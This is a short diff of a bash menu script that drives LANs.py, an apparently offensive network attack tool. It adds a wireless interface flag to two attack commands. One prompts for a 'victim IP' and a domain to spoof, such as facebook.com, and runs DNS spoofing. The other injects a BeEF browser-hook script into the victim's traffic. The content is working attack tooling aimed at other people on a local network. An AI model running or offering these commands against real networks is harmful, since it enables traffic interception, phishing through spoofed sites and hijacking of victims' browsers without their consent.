@@ -45,7 +45,7 @@ f_aggressive(){
     clear
     read -p "Enter victim IP:" victimip
     read -p "Enter domain to spoof (e.g. facebook.com):" spoofdns
-    python $LANspy -u -p -n -na -dns $spoofdns -set -d -ip $victimip
+    python $LANspy -i wlan1 -u -p -n -na -dns $spoofdns -set -d -ip $victimip
     f_interface
 }
 ##################################################################
@@ -54,7 +54,7 @@ f_aggressive(){
 f_beef(){
     clear
     read -p "Enter victim IP:" victimip
-    python LANs.py -b http://localhost:3000/hook.js -ip $victimip
+    python LANs.py -i wlan1 -b http://localhost:3000/hook.js -ip $victimip
     f_interface
 }
 ##################################################################
